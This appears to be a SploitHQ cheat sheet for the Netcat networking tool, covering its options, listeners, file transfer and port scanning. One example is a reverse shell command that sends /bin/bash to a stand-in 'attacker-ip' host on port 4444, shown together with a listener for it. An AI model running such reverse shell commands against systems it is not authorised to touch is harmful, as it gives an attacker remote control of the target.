# Netcat (nc) – The Swiss Army Knife of Networking

**Netcat** (`nc`) is a lightweight command-line utility used for reading from and writing to network connections. It supports TCP and UDP protocols and is invaluable for debugging, banner grabbing, reverse shells, port scanning, file transfers, and service emulation.

🔗 [Explore Netcat Usage on SploitHQ](https://sploithq.com/nc-netcat)

---

## 🔍 What Can Netcat Do?

- Connect to remote services via TCP or UDP
- Set up simple servers and listeners
- Transfer files between systems
- Create bind and reverse shells
- Perform banner grabbing and basic port scans

---

## ⚙️ Basic Syntax

```bash
nc [options] [host] [port]
```

---

## 🧰 Common Options

| Option        | Description                                           |
|---------------|-------------------------------------------------------|
| `-l`          | Listen mode (server)                                  |
| `-p <port>`   | Local port to use                                     |
| `-v`          | Verbose output                                        |
| `-n`          | Do not resolve DNS names                              |
| `-z`          | Zero-I/O mode (useful for port scanning)              |
| `-u`          | Use UDP instead of TCP                                |
| `-e <cmd>`    | Execute a program after connection (may be restricted)|
| `-w <secs>`   | Set timeout for connects and final net reads          |
| `-k`          | Keep listening after client disconnects               |

---

## 🧪 Examples

### Connect to a web server (port 80)
```bash
nc example.com 80
```

### Listen on port 4444 (for reverse shell)
```bash
nc -lvnp 4444
```

### Reverse shell (target side)
```bash
nc attacker-ip 4444 -e /bin/bash
```

### File transfer (server side)
```bash
nc -l 1234 > received.txt
```

### File transfer (client side)
```bash
nc server-ip 1234 < file.txt
```

### Simple port scan (scan ports 1–1000)
```bash
nc -zv target-ip 1-1000
```

---

## 🔐 Notes on `-e`

- The `-e` option may be disabled in some versions of Netcat for security reasons.
- Use [Ncat](https://sploithq.com/ncat) if you need built-in support for `-e` and SSL.

---

## 🌐 SploitHQ Netcat Guide

👉 [Use the Netcat Cheatsheet and Payloads](https://sploithq.com/nc-netcat)

- Create bind/reverse shells
- Emulate services
- Transfer files and perform scans

---

## 🔗 Useful Links

- [Netcat Man Page](https://man7.org/linux/man-pages/man1/nc.1.html)
- [SploitHQ Netcat Page](https://sploithq.com/nc-netcat)

---

## 📄 License

Netcat is free software and included in many Unix-like systems.  
This documentation is provided by [SploitHQ](https://sploithq.com) for educational and legal security research use.
